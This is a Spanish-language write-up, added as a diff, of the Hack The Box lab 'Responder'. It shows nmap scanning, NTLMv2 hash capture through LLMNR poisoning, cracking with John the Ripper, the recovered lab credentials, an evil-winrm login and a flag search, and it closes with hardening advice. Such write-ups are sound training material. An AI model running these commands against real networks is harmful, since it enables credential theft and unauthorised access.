@@ -1,0 +1,47 @@
+Markdown
+# Write-up: Responder (Hack The Box)
+
+## 📋 Resumen Ejecutivo
+Laboratorio centrado en la explotación de protocolos legados (LLMNR/NBT-NS) para la captura de hashes NTLMv2 y posterior acceso remoto mediante WinRM.
+
+---
+
+## 🔍 Fase 1: Reconocimiento
+Escaneo inicial para identificar servicios activos:
+```bash
+nmap -sV -sC -p- <IP_OBJETIVO>
+Servicios clave: HTTP, SMB, WinRM (5985/TCP).
+
+🔑 Fase 2: Explotación
+Captura: Uso de Responder para la interceptación de tráfico.
+
+Descifrado: Ataque de fuerza bruta con John the Ripper:
+
+Bash
+# Asegurar el formato del hash (evitar saltos de línea)
+echo -n 'Administrator::RESPONDER:...' > hashh.txt
+
+# Ejecución de descifrado
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashh.txt
+
+# Visualización de credenciales
+john --show hashh.txt
+Credenciales: Administrator:badminton
+
+💻 Fase 3: Acceso
+Autenticación y enumeración mediante evil-winrm:
+
+Bash
+evil-winrm -i <IP_OBJETIVO> -u Administrator -p badminton
+Localización de la flag:
+
+PowerShell
+Get-ChildItem -Path C:\ -Recurse -Include *flag.txt* -ErrorAction SilentlyContinue
+🛡️ Fase 4: Fortificación (Hardening)
+GPO: Deshabilitar LLMNR y NetBIOS.
+
+SMB: Habilitar SMB Signing obligatorio.
+
+WinRM: Migrar a HTTPS y restringir ACLs.
+
+Monitorización: Implementar EDR para detectar enumeración no autorizada.
